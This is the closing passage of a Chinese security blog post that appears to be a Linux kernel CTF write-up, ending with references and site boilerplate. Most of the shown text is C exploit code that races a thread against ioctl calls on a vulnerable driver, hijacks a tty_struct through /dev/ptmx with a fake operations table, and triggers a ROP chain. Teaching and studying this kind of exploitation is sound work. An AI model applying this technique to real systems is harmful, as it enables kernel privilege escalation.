        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
    
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
    
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR);
        if (fd2 < 0) {
            puts("[-] open error");
            exit(-1); 
        }
        puts("[+] Now we can write tty struct Chunk!");
    
        io.size  = 0x30;
        ioctl(fd1, 0x30003, &io);
    
        IO_value[3] = (size_t)Fake_tty_operations;
        ioctl(fd1, 0x30002, &io);
    
        puts("[+] Now ROP!");
        ioctl(fd2, 0, 0);
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-21-115455.png)

## 0x08 参考链接

[CTF-Wiki Linux Kernel](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel)

[When kallsyms doesn’t show addresses even though kptr_restrict is 0 – hatena
](https://kernhack.hatenablog.com/entry/2018/10/16/231945)

[kernel pwn入门(1) 简易环境搭建](http://pzhxbz.cn/?p=98)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ERROR404** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/201454](/post/id/201454)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Kernel](/tag/Kernel)

 **+1** __14赞

 __收藏

![](https://p5.ssl.qhimg.com/t01fc6ae8fa56997fe6.jpg) ERROR404

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

